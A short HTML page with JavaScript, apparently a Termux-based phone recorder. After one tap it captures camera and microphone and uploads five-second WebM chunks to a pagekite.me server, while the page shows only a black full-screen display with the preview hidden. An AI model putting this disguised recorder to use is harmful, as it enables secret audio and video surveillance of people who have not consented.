<!DOCTYPE html>
<html>
<body style="background:#000;margin:0;overflow:hidden">
    <video id="v" autoplay muted playsinline style="display:none"></video>
    <script>
        const TOKEN = "your_secret_token_here";
        const URL = "https://chung0930.pagekite.me/upload";
        let chunks = [];

        async function start() {
            const stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
            document.getElementById('v').srcObject = stream;
            const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
            
            recorder.ondataavailable = e => {
                if (e.data.size > 0) {
                    const fd = new FormData();
                    fd.append('file', e.data, `rec_${Date.now()}.webm`);
                    fd.append('client_id', 'termux_vcr');
                    fetch(URL, {
                        method: 'POST',
                        headers: {'Authorization': `Bearer ${TOKEN}`},
                        body: fd
                    });
                }
            };
            
            // 每 5 秒傳送一次片段
            setInterval(() => { recorder.stop(); recorder.start(); }, 5000);
            recorder.start();
            document.documentElement.requestFullscreen();
        }
        window.onclick = start; // 點擊畫面一下即開始錄影並全螢幕
    </script>
</body>
</html>
